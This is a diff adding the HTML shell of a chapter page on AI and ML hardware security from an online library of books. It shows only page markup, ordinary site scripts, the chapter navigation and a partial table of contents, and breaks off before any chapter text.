@@ -1,0 +1,3475 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  
+    <meta name="description" content="Pustakālaya, a library of books on Indian knowledge traditions, science, technology and language, read page by page in the manner of an e-book reader, online or offline.">
+  
+  
+    <meta name="author" content="Nikhil Kumar Rajput, Ramanujan College, University of Delhi">
+  
+  
+    <link rel="canonical" href="https://nikhilkrajput.github.io/pustakalaya/science/hardware_security/ch34-ai-and-ml-hardware-security.html">
+  
+  
+    <link rel="prev" href="ch33-satellite-and-aerospace-hardware-security.html">
+  
+  
+    <link rel="next" href="ch35-usb-and-thunderbolt-security.html">
+  
+  <link rel="icon" href="../../assets/icons/favicon-32.png" sizes="32x32">
+  <link rel="icon" href="../../assets/icons/favicon.svg" type="image/svg+xml">
+  <link rel="manifest" href="../../manifest.webmanifest">
+  <link rel="apple-touch-icon" href="../../assets/icons/apple-touch-icon.png">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Pustakālaya">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="application-name" content="Pustakālaya"><script id="bjp-books" type="application/json">[{"id": "vol01_veda", "lang": "en", "path": "vol01_veda"}, {"id": "vol02_upanisad", "lang": "en", "path": "vol02_upanisad"}, {"id": "vol03_darsana", "lang": "en", "path": "vol03_darsana"}, {"id": "vol04_buddha_jina", "lang": "en", "path": "vol04_buddha_jina"}, {"id": "vol05_yoga", "lang": "en", "path": "vol05_yoga"}, {"id": "vol06_tantra", "lang": "en", "path": "vol06_tantra"}, {"id": "vol07_itihasa", "lang": "en", "path": "vol07_itihasa"}, {"id": "vol08_kavya", "lang": "en", "path": "vol08_kavya"}, {"id": "vol09_sangita_natya", "lang": "en", "path": "vol09_sangita_natya"}, {"id": "vol10_sabda", "lang": "en", "path": "vol10_sabda"}, {"id": "vol11_ganita", "lang": "en", "path": "vol11_ganita"}, {"id": "vol12_jyotisa", "lang": "en", "path": "vol12_jyotisa"}, {"id": "vol13_ayurveda", "lang": "en", "path": "vol13_ayurveda"}, {"id": "vol14_rasayana", "lang": "en", "path": "vol14_rasayana"}, {"id": "vol15_krsi_jiva", "lang": "en", "path": "vol15_krsi_jiva"}, {"id": "vol16_vastu", "lang": "en", "path": "vol16_vastu"}, {"id": "vol17_silpa_karu", "lang": "en", "path": "vol17_silpa_karu"}, {"id": "vol18_rajaniti_dharma", "lang": "en", "path": "vol18_rajaniti_dharma"}, {"id": "vol19_vanijya_samudra", "lang": "en", "path": "vol19_vanijya_samudra"}, {"id": "vol20_yuddha", "lang": "en", "path": "vol20_yuddha"}, {"id": "vol21_bhugola", "lang": "en", "path": "vol21_bhugola"}, {"id": "vol22_manas_siksa", "lang": "en", "path": "vol22_manas_siksa"}, {"id": "vol23_jana_jati", "lang": "en", "path": "vol23_jana_jati"}, {"id": "vol24_samanvaya", "lang": "en", "path": "vol24_samanvaya"}, {"id": "hardware_security", "lang": "en", "path": "science/hardware_security"}, {"id": "drones_missiles", "lang": "en", "path": "science/drones_missiles"}, {"id": "code_to_electrons", "lang": "en", "path": "science/code_to_electrons"}, {"id": "dpi_ndr", "lang": "en", "path": "science/dpi_ndr"}, {"id": "quantum", "lang": "en", "path": "quantum/quantum"}, {"id": "qml", "lang": "en", "path": "quantum/qml"}, {"id": "asic", "lang": "en", "path": "computing/asic"}, {"id": "compute", "lang": "en", "path": "computing/compute"}, {"id": "memory", "lang": "en", "path": "computing/memory"}, {"id": "os", "lang": "en", "path": "computing/os"}, {"id": "databases", "lang": "en", "path": "computing/databases"}, {"id": "datacenters", "lang": "en", "path": "computing/datacenters"}, {"id": "networks", "lang": "en", "path": "computing/networks"}, {"id": "cellular", "lang": "en", "path": "computing/cellular"}, {"id": "ml", "lang": "en", "path": "computing/ml"}, {"id": "security", "lang": "en", "path": "cyber/security"}, {"id": "trust", "lang": "en", "path": "cyber/trust"}, {"id": "optimization_methods", "lang": "en", "path": "courses/optimization_methods"}, {"id": "quantum_computing_applications", "lang": "en", "path": "courses/quantum_computing_applications"}, {"id": "dbms_course", "lang": "en", "path": "courses/dbms_course"}, {"id": "english_book", "lang": "en", "path": "language/english_book"}, {"id": "english_book_hinglish", "lang": "en", "path": "language/english_book_hinglish"}, {"id": "english_book_hi", "lang": "hi", "path": "language/english_book_hi"}]</script><script>
+    try {
+      if ((window.matchMedia && (matchMedia("(display-mode: standalone)").matches || matchMedia("(display-mode: fullscreen)").matches)) || navigator.standalone === true) {
+        document.documentElement.className += " bjp-standalone";
+      }
+    } catch (e) { /* not an installed app */ }
+  </script>
+  <script>
+    /* a book opened from its cover on the shelf: the page stays blank, in the cover's colour, until the reader is up */
+    try {
+      var cv = sessionStorage.getItem("bjp.reader.cover");
+      if (cv && sessionStorage.getItem("bjp.reader.open") === "1") {
+        var c = JSON.parse(cv), de = document.documentElement;
+        de.className += " bjp-booting";
+        if (c && /^#[0-9a-f]{3,8}$/i.test(c.bg || "")) de.style.background = c.bg;
+        setTimeout(function () { de.classList.remove("bjp-booting"); de.style.background = ""; }, 3000);
+      }
+    } catch (e) { /* no session storage: the page simply opens as usual */ }
+  </script>
+
+    
+      
+        <title>34. AI and ML Hardware Security - Pustakālaya</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Serif:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Serif";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+      <link rel="stylesheet" href="../../assets/reader.css">
+    
+      <link rel="stylesheet" href="../../assets/app.css">
+    
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+Devanagari:wght@400;600;700&display=swap">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sec-ai-threat-model" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../index.html" title="Pustakālaya" class="md-header__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pustakālaya
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              34. AI and ML Hardware Security
+            
+          </span>
+        </div>
+      </div>
+    </div><a href="../../index.html" class="bjp-libbtn" aria-label="Library: all books" title="Library: all books">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 20V5h4v15M8 20V9h4v11M14 20L12.6 6l3.8-.8 3 14.2M3 20h18"/></svg><span>Library</span>
+    </a>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary bjp-nav bjp-nav--book" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../index.html" title="Pustakālaya" class="md-nav__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    Pustakālaya
+  </label>
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      <li class="md-nav__item bjp-nav-all">
+        <a href="../../index.html" class="md-nav__link" aria-label="All books: back to the library">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 12H5M11 6l-6 6 6 6"/></svg>
+          <span class="md-ellipsis">All books</span>
+        </a>
+      </li>
+      <li class="md-nav__item bjp-nav-book" role="presentation"><span class="bjp-nav-head">Hardware Security</span></li>
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview and preface
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch01-trusted-platform-module-tpm-2-0.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Trusted Platform Module (TPM 2.0)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch02-hardware-security-module-hsm.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Hardware Security Module (HSM)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch03-physically-unclonable-functions-puf.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Physically Unclonable Functions (PUF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch04-trusted-execution-environment-tee.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Trusted Execution Environment (TEE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch05-hardware-root-of-trust.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Hardware Root of Trust
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch06-side-channel-attack-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Side-Channel Attack Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch07-hardware-trojan-detection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Hardware Trojan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch08-secure-boot.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Secure Boot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch09-true-random-number-generator-trng.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. True Random Number Generator (TRNG)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch10-fpga-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. FPGA Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch11-iommu-and-dma-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. IOMMU and DMA Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch12-memory-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. Memory Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch13-anti-tamper-technologies.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Anti-Tamper Technologies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch14-hardware-attestation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Hardware Attestation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch15-automotive-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Automotive Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch16-post-quantum-cryptography-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Post-Quantum Cryptography Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch17-jtag-and-debug-interface-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. JTAG and Debug Interface Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch18-hardware-cryptographic-accelerators.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Hardware Cryptographic Accelerators
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch19-secure-key-management.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. Secure Key Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch20-iot-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. IoT Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch21-secure-elements-and-smart-cards.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. Secure Elements and Smart Cards
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch22-fido2-and-webauthn-hardware-security-keys.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. FIDO2 and WebAuthn Hardware Security Keys
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch23-hardware-cryptocurrency-wallets.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Hardware Cryptocurrency Wallets
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch24-network-security-processors.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Network Security Processors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch25-cheri-capability-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    25. CHERI Capability Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch26-risc-v-security-extensions.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    26. RISC-V Security Extensions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch27-formal-verification-of-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    27. Formal Verification of Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch28-hardware-supply-chain-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    28. Hardware Supply Chain Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch29-5g-and-telecom-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    29. 5G and Telecom Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch30-medical-device-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    30. Medical Device Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch31-ics-and-scada-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    31. ICS and SCADA Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch32-biometric-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    32. Biometric Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch33-satellite-and-aerospace-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    33. Satellite and Aerospace Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    34. AI and ML Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="ch34-ai-and-ml-hardware-security.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    34. AI and ML Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-threat-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.1 AI Hardware Threat Model
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-ai-chip-landscape" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2 AI Chip Landscape
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.2 AI Chip Landscape">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3421-nvidia-h100-sxm5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.1 NVIDIA H100 SXM5
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3422-google-tpu-v4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.2 Google TPU v4
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3423-aws-trainium2-and-inferentia2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.3 AWS Trainium2 and Inferentia2
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3424-cerebras-wse-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.2.4 Cerebras WSE-3
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-h100-cc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.3 NVIDIA H100 Confidential Computing Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.3 NVIDIA H100 Confidential Computing Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3431-h100-confidential-computing-technical-details" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.3.1 H100 Confidential Computing Technical Details
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-weight-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.4 Model Weight Extraction Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.4 Model Weight Extraction Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3441-timing-side-channel-on-npu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.4.1 Timing Side-Channel on NPU
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3442-power-analysis-on-npu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.4.2 Power Analysis on NPU
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-membership-inference" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.5 Membership Inference and Model Inversion
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="34.5 Membership Inference and Model Inversion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3451-membership-inference-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        34.5.1 Membership Inference Attacks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
